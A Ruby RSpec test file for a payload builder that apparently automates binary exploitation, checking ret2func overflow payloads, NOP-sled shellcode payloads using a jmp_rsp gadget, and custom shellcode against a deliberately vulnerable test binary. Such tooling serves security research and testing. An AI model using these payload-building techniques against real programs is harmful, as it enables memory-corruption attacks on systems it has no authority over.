# frozen_string_literal: true

require "lictor"
require "tmpdir"

builder = ["../../augure/profiler/spec/support/binary_builder.rb",
  "../augure/profiler/spec/support/binary_builder.rb"]
  .map { |p| File.expand_path(p, __dir__) }
  .find { |p| File.file?(p) }
require_relative builder

RSpec.describe Lictor::PayloadBuilder do
  let(:dir) { Dir.mktmpdir }
  let(:binary) { ProfilerBinaryBuilder.vulnerable }
  let(:out) { File.join(dir, "payload.bin") }

  it "builds the ret2func payload: measured padding + ret_align + the win address" do
    facts = "nx(\"true\").\npie(\"false\").\nwin_symbol(\"win\", 4196182).\n" \
            "gadget(\"ret_align\", 4196100).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "ret2func", out: out)
    expect(result[:offset]).to eq(16)
    expect(result[:offset_source]).to eq("static-frame")
    expect(result[:sink]).to eq("strcpy")
    expect(result[:ret_source]).to include("win_symbol:win")
    body = File.binread(out)
    expect(body).not_to include([4196100].pack("Q<")) # offset 16: already aligned, no gadget
    expect(body).to eq(("A" * 16).b + [4196182].pack("Q<"))
  end

  it "builds the shellcode payload: sled + jmp_rsp + the assembled shellcode" do
    facts = "nx(\"false\").\ngadget(\"jmp_rsp\", 4196200).\n"
    result = described_class.build(binary: binary, facts: facts, technique: "shellcode", out: out)
    expect(result[:ret_source]).to include("gadget:jmp_rsp")
    body = File.binread(out)
    expect(body).to start_with(("\x90" * result[:offset]).b)
    expect(body.bytesize).to be > result[:offset] + 8
    expect(result[:size]).to eq(body.bytesize)
  end

  it "uses a custom payload file verbatim for the shellcode template" do
    custom = File.join(dir, "custom.sc")
    File.binwrite(custom, "\xcc" * 11)
    facts = "gadget(\"jmp_rsp\", 99).\n"
    described_class.build(binary: binary, facts: facts, technique: "shellcode",
      out: out, payload_file: custom)
    body = File.binread(out)
    expect(body).to end_with(("\xcc" * 11).b)
  end

  it "refuses honestly when the facts cannot drive the template" do
    expect {
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "ret2func", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /win_symbol/)
    expect {
      described_class.build(binary: binary, facts: "nx(\"true\").\n", technique: "ret2libc", out: out)
    }.to raise_error(Lictor::PayloadBuilder::BuildError, /layout/)
  end
end
